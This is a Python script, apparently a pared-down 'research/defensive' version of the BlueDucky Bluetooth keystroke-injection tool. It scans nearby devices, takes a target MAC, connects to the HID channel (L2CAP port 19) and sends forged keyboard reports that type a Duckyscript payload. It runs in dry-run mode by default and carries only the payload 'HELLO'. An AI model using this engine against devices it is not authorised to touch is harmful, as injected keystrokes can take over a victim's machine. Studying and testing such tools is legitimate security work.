#!/usr/bin/env python3
# ============================================================
# BlueDucky – Hardened Duckyscript Engine (Research / Defensive)
# ============================================================

import binascii, sys, time, datetime, logging, argparse, subprocess, os, asyncio
from multiprocessing import Process
from enum import Enum

# ============================================================
# SAFE BLUETOOTH IMPORT (SYSTEM BLUEZ ONLY)
# ============================================================

try:
    import bluetooth
except ImportError:
    print("❌ python3-bluez not installed")
    print("Run: sudo apt install python3-bluez bluetooth bluez python3-pydbus")
    sys.exit(1)

from pydbus import SystemBus

# ============================================================
# GLOBAL CONFIG / FLAGS
# ============================================================

DRY_RUN = True                 # overridden by --live
ENABLE_BLE_RECON = True
ENABLE_RSSI_LOGGING = True
ENABLE_RF_CORRELATION = False

LOG_DIR = "session_logs"
os.makedirs(LOG_DIR, exist_ok=True)

RF_SWEEP_CMD = [
    "hackrf_sweep",
    "-f", "2400:2483",
    "-w", "200000",
    "-l", "32",
    "-g", "20"
]

child_processes = []

# ============================================================
# LOGGING
# ============================================================

NOTICE_LEVEL = 25
logging.addLevelName(NOTICE_LEVEL, "NOTICE")

def notice(self, message, *args, **kwargs):
    if self.isEnabledFor(NOTICE_LEVEL):
        self._log(NOTICE_LEVEL, message, args, **kwargs)

logging.Logger.notice = notice

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )

# ============================================================
# UTILITIES
# ============================================================

def run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)

def get_rssi(target):
    try:
        out = subprocess.check_output(
            ["bluetoothctl", "info", target],
            text=True
        )
        for line in out.splitlines():
            if "RSSI" in line:
                return int(line.split()[-1])
    except Exception:
        pass
    return None

# ============================================================
# BLE RECON (PASSIVE)
# ============================================================

async def ble_recon(duration=5):
    try:
        from bleak import BleakScanner
    except ImportError:
        logging.warning("bleak not installed — skipping BLE recon")
        return

    devices = await BleakScanner.discover(timeout=duration)
    logging.info("BLE Recon Results:")
    for d in devices:
        logging.info(f"BLE {d.address} RSSI={d.rssi} NAME={d.name}")

# ============================================================
# ADAPTER CONTROL
# ============================================================

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        self.adapter = self.bus.get("org.bluez", f"/org/bluez/{iface}")

    def power(self, state):
        self.adapter.Powered = state

    def reset(self):
        self.power(False)
        time.sleep(1)
        self.power(True)

    def hard_reset(self):
        logging.warning("HARD adapter reset")
        run(["sudo", "hciconfig", self.iface, "down"])
        time.sleep(1)
        run(["sudo", "hciconfig", self.iface, "up"])
        time.sleep(2)

    def auto_recover(self):
        try:
            self.reset()
        except Exception:
            self.hard_reset()

# ============================================================
# EXCEPTIONS
# ============================================================

class ConnectionFailureException(Exception):
    pass

class ReconnectionRequiredException(Exception):
    def __init__(self, msg, line=0, pos=0):
        super().__init__(msg)
        self.current_line = line
        self.current_position = pos

# ============================================================
# L2CAP CLIENT (RECONNECT SAFE)
# ============================================================

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.sock = None
        self.connected = False

    def connect(self, timeout=2):
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        sock.connect((self.addr, self.port))
        sock.setblocking(False)
        self.sock = sock
        self.connected = True
        logging.info(f"Connected L2CAP port {self.port}")
        return True

    def close(self):
        if self.sock:
            self.sock.close()
        self.connected = False
        self.sock = None

    def send(self, data):
        if DRY_RUN:
            logging.notice(f"[DRY-RUN][TX-{self.port}] {binascii.hexlify(data).decode()}")
            return

        for attempt in range(3):
            try:
                self.sock.send(data)
                return
            except bluetooth.btcommon.BluetoothError as ex:
                logging.warning(f"TX retry {attempt+1}: {ex}")
                time.sleep(0.2)
                self.close()
                self.connect()

        raise ReconnectionRequiredException("Send failed")

# ============================================================
# KEY / MODIFIER ENUMS (UNCHANGED)
# ============================================================

class Modifier_Codes(Enum):
    CTRL = 0x01
    SHIFT = 0x02
    ALT = 0x04
    GUI = 0x08

class Key_Codes(Enum):
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    ENTER = 0x28
    SPACE = 0x2c
    TAB = 0x2b

# ============================================================
# HID ENCODING
# ============================================================

def encode_keyboard_input(*args):
    keycodes = []
    flags = 0
    for a in args:
        if isinstance(a, Key_Codes):
            keycodes.append(a.value)
        elif isinstance(a, Modifier_Codes):
            flags |= a.value
    keycodes += [0] * (7 - len(keycodes))
    return bytes([0xa1, 0x01, flags, 0x00] + keycodes)

# ============================================================
# DUCKYSCRIPT ENGINE (UNCHANGED LOGIC)
# ============================================================

def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    for line_number, line in enumerate(duckyscript):
        if line_number < current_line:
            continue

        line = line.strip()
        if not line or line.startswith("REM"):
            continue

        for ch in line:
            if ENABLE_RSSI_LOGGING:
                rssi = get_rssi(client.addr)
                logging.info(f"[RSSI] {rssi} dBm before '{ch}'")

            ts = time.time()
            logging.info(f"[HID] '{ch}' @ {ts}")

            if ch.isalpha():
                key = getattr(Key_Codes, ch.lower())
                client.send(encode_keyboard_input(key))
                time.sleep(0.01)
                client.send(encode_keyboard_input())

# ============================================================
# RF CORRELATION
# ============================================================

def start_rf_sweep():
    logfile = f"{LOG_DIR}/rf_sweep.csv"
    return subprocess.Popen(
        RF_SWEEP_CMD + ["-r", logfile],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

# ============================================================
# MAIN
# ============================================================

def main():
    global DRY_RUN

    parser = argparse.ArgumentParser()
    parser.add_argument("--adapter", default="hci0")
    parser.add_argument("--live", action="store_true")
    args = parser.parse_args()

    if args.live:
        DRY_RUN = False

    logging.warning("LIVE MODE" if not DRY_RUN else "DRY-RUN MODE")

    if ENABLE_BLE_RECON:
        asyncio.run(ble_recon())

    rf_proc = None
    if ENABLE_RF_CORRELATION:
        rf_proc = start_rf_sweep()

    target = input("Target Bluetooth MAC: ").strip()
    adapter = Adapter(args.adapter)
    client = L2CAPClient(target, 19)

    try:
        client.connect()
        duckyscript = ["HELLO"]
        process_duckyscript(client, duckyscript)

    except ReconnectionRequiredException:
        logging.error("Recovering adapter")
        adapter.auto_recover()

    finally:
        if rf_proc:
            rf_proc.terminate()

# ============================================================
if __name__ == "__main__":
    setup_logging()
    main()
